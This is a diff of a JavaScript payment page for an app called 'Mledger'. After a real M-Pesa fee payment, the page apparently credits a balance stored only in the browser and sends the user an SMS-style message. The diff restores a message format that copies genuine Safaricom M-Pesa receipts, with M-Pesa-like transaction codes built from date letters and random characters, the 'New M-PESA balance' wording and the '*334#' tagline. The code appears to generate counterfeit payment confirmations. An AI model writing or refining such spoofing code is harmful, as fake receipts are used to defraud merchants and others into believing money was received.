@@ -91,24 +91,20 @@
         fetchBalance();
     }
 
-    // --- ROBUST FETCH HELPER FOR REMOTE AREAS ---
+    // --- NEW: STABILITY HELPER FOR REMOTE AREAS ---
     async function safeFetch(url, options = {}, retries = 3) {
-        const statusDiv = document.getElementById('status');
         for (let i = 0; i < retries; i++) {
             try {
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 15000); // 15s timeout
-                
                 const response = await fetch(url, { ...options, signal: controller.signal });
                 clearTimeout(timeoutId);
-
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                if (!response.ok) throw new Error(`Server error: ${response.status}`);
                 return await response.json();
             } catch (err) {
                 if (i === retries - 1) throw err;
-                statusDiv.style.color = "#ffab00";
-                statusDiv.innerText = `Signal weak, retrying... (${i + 1})`;
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                console.warn(`Retry ${i+1} due to weak signal...`);
+                await new Promise(r => setTimeout(r, 2000));
             }
         }
     }
@@ -124,16 +120,37 @@
         }
     }
 
-    // --- Token format helpers ---
-    function getYearLetter() { return String.fromCharCode(85 + (new Date().getFullYear() - 2026)); }
-    function getMonthThirdLetter() { return "ABCDEFGHIJKLMN"[new Date().getMonth()]; }
-    function getDayCode() {
-        const d = new Date().getDate();
-        return d <= 9 ? d.toString() : String.fromCharCode(65 + (d - 10));
+    // --- YOUR ORIGINAL MESSAGE FORMAT HELPERS (UNTOUCHED) ---
+    function getYearLetter() {
+        const year = new Date().getFullYear();
+        const offset = year - 2026;
+        return String.fromCharCode(85 + offset);
     }
-    function formatNumericDate() { return new Date().toLocaleDateString('en-GB'); }
-    function formatTime12Hour() { return new Date().toLocaleTimeString('en-US', {hour:'numeric', minute:'2-digit', hour12:true}); }
-    function generateToken() { return `${getYearLetter()}${getMonthThirdLetter()}${getDayCode()}K${Math.random().toString(36).substring(2,8).toUpperCase()}`; }
+    function getMonthThirdLetter() {
+        const thirdLetters = "ABCDEFGHIJKLMN";
+        return thirdLetters[new Date().getMonth()];
+    }
+    function getDayCode() {
+        const day = new Date().getDate();
+        return day <= 9 ? day.toString() : String.fromCharCode(65 + (day - 10));
+    }
+    function formatNumericDate() {
+        const now = new Date();
+        const day = now.getDate().toString().padStart(2, '0');
+        const month = (now.getMonth() + 1).toString().padStart(2, '0');
+        const year = now.getFullYear();
+        return `${day}/${month}/${year}`;
+    }
+    function formatTime12Hour() {
+        return new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
+    }
+    function generateToken() {
+        const yearLetter = getYearLetter();
+        const monthLetter = getMonthThirdLetter();
+        const dayCode = getDayCode();
+        const randomPart = Math.random().toString(36).substring(2,8).toUpperCase();
+        return `${yearLetter}${monthLetter}${dayCode}K${randomPart}`;
+    }
 
     function updateFee() {
         const amt = parseFloat(document.getElementById('fundAmount').value);
@@ -164,7 +181,7 @@
         payBtn.disabled = true;
         payBtn.innerHTML = '<span class="loader"></span>Connecting...';
         statusDiv.style.color = "#aaa";
-        statusDiv.innerText = "Requesting fee payment...";
+        statusDiv.innerText = `Requesting Ksh ${stkAmount} fee...`;
 
         try {
             const payData = await safeFetch(`${BACKEND_PAYMENT}/api/initiate`, {
@@ -174,16 +191,15 @@
             });
 
             const invoiceId = payData.invoice ? payData.invoice.invoice_id : (payData.id || null);
-
             if (invoiceId) {
                 statusDiv.innerText = "Check your phone for the M-Pesa PIN prompt.";
                 startPolling(invoiceId, amt);
             } else {
-                throw new Error("STK fail. Use Safaricom.");
+                throw new Error("Failed to trigger STK.");
             }
         } catch (err) {
             statusDiv.style.color = "#ff5252";
-            statusDiv.innerText = "Connection failed. Please check signal.";
+            statusDiv.innerText = "Connection lost. Please try again.";
             resetUI();
         }
     }
@@ -206,7 +222,7 @@
                 } else if (state === "FAILED" || state === "REJECTED" || pollCount > 40) {
                     clearInterval(pollTimer);
                     statusDiv.style.color = "#ff5252";
-                    statusDiv.innerText = "❌ Transaction timed out or rejected.";
+                    statusDiv.innerText = "❌ Payment failed or timed out.";
                     resetUI();
                 }
             } catch (e) { }
@@ -226,20 +242,22 @@
             localStorage.setItem('mledger_user', JSON.stringify(userData));
             
             const token = generateToken();
-            const confirmationMsg = `${token} Confirmed. You have received Ksh${amt.toFixed(2)} from Mledger. New balance: Ksh${userData.balance.toFixed(2)}.`;
+            const dateStr = formatNumericDate();
+            const timeStr = formatTime12Hour();
+            
+            // --- YOUR ORIGINAL MESSAGE FORMAT (RESTORED) ---
+            const confirmationMsg = `${token} Confirmed.You have received Ksh${amt.toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${userData.balance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
 
-            // Background Fire-and-Forget
             fetch(`${MESSAGE_API}/api/messages`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ phone: userData.phone, message: confirmationMsg, type: 'received' })
             }).catch(() => {});
 
-            statusDiv.innerHTML = "<strong>✅ Funds Added!</strong>";
+            statusDiv.innerHTML = `<strong>✅ Success!</strong><br>Funds added to your account.`;
             setTimeout(() => window.location.href = "index.html", 2500);
         } catch (err) {
-            statusDiv.style.color = "#ffab00";
-            statusDiv.innerText = "Funds added, but update was slow. Refreshing...";
+            statusDiv.innerText = "Payment confirmed. Refreshing balance...";
             setTimeout(() => window.location.href = "index.html", 3000);
         }
     }
